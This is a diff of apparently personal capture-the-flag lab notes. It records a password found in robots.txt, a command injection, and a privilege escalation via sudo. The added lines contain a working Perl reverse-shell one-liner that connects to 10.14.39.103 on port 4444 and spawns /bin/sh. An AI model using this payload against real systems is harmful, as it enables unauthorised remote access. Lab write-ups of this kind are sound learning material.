@@ -9,4 +9,14 @@ password  => Wubbalubbadubdub / i got feom robots.txt
 grep -R .   => i inject like this
 
 
-rabbit hole    => result i decode with base 64 for many times
+=> I use this payload to get exploit
+
+perl -e 'use Socket;$i="10.14.39.103";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+![[Pasted image 20230115195040.png]]
+
+I got root hit form here 
+
+sudo bash    or sudo su
+cd /root  => i got root from here
